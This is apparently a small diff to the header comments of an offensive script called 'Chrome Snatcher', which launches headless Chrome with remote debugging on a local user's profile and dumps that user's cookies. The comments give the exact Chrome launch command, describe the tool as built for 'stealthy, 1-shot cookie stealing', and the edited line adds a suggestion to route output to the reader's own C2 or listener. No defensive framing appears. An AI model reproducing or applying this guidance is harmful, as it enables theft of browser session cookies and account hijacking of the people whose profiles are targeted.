@@ -2,7 +2,7 @@
 # before running this, run: chrome --headless=new --remote-debugging-port=9222 --remote-allow-origins="*" --no-sandbox --disable-gpu --profile-directory="Profile <x>" (In my case it wasn't 0 or 1, so you might have to do some additional recon/trial/error here)
 
 # Chrome Snatcher uses headless Chrome Debugging Protocol, and after you load up the [local] user's profile (via the chrome + args above), 
-# it grabs cookies, and prints to console (or outputs to file because of size, adjust as needed)
+# it grabs cookies, and prints to console (or outputs to file because of size, adjust as needed, incorporate your own C2, listener, etc)
 # all using native Python (instead of websockets, pychrome, etc)
 # 
 # The reason I built it is because I couldn't find a tool for stealthy, 1-shot cookie stealing for Chrome.
